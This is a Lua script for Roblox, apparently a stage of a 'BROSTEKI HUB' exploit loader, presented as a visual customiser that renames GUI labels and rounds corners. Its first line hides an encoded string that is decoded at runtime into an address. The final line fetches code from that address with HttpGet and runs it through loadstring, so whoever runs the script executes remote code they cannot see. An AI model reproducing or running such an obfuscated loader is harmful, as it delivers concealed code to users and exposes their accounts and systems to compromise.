
--[[ STAGE 2: VISUAL CORE ]]
local h7HXZqSlXofv9vIWPqN0is="\052\045\047\050\093\150\154\141\101\105\112\113\111\163\173\116\127\141\135\203\173\162\171\173\176\239\209\196\203\228\013\239\243\250\251\249\045\057\063\069\036\046\027\056\045\099\111\074\058\063\098\120\147\094\120\125\105\171\181\217\215\222\235\157\156\186\194\197\236\247\191\195\213\016\240\220\235\002\238\243\005\028\015\039\043\036\055\042\068\053\061\124\089\085\106\147\153\180\129\138\140\146\132"local HDQjXXvj1z3fy3hHWdz8=239 local PcEoQ1yPW2onShr=116 local ngftunMkAPUz1X=0 local pzZqWvFUs2Azn6JZGU4v6=6 local uIlM47pxNW0ULKBz=31 local GKmHmckatf9t=true local cgiw6sSU_59JCFpu=bit32 and bit32.bxor if not cgiw6sSU_59JCFpu then cgiw6sSU_59JCFpu=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local zC_e0rbElEPiCl0xf6BpS={}for p96eJeJnm7NqGm6oPO9Iv=1,#h7HXZqSlXofv9vIWPqN0is do local ylSI2Nv8bTqosLGkF7iB=string.byte(h7HXZqSlXofv9vIWPqN0is,p96eJeJnm7NqGm6oPO9Iv)local ZZhCP24ga6Upqhk9EpkvH=(PcEoQ1yPW2onShr+(p96eJeJnm7NqGm6oPO9Iv*pzZqWvFUs2Azn6JZGU4v6)+uIlM47pxNW0ULKBz)%256 if ngftunMkAPUz1X==0 then ylSI2Nv8bTqosLGkF7iB=(ylSI2Nv8bTqosLGkF7iB-ZZhCP24ga6Upqhk9EpkvH)%256 zC_e0rbElEPiCl0xf6BpS[p96eJeJnm7NqGm6oPO9Iv]=string.char(cgiw6sSU_59JCFpu(ylSI2Nv8bTqosLGkF7iB,HDQjXXvj1z3fy3hHWdz8))else ylSI2Nv8bTqosLGkF7iB=cgiw6sSU_59JCFpu(ylSI2Nv8bTqosLGkF7iB,HDQjXXvj1z3fy3hHWdz8)zC_e0rbElEPiCl0xf6BpS[p96eJeJnm7NqGm6oPO9Iv]=string.char((ylSI2Nv8bTqosLGkF7iB-ZZhCP24ga6Upqhk9EpkvH)%256)end end local cg8oUwu7PLjXcj0g0=table.concat(zC_e0rbElEPiCl0xf6BpS)if GKmHmckatf9t then cg8oUwu7PLjXcj0g0=string.reverse(cg8oUwu7PLjXcj0g0)end local cYS9aP0EAPVf=cg8oUwu7PLjXcj0g0
local HubName = "BROSTEKI HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(cYS9aP0EAPVf))()
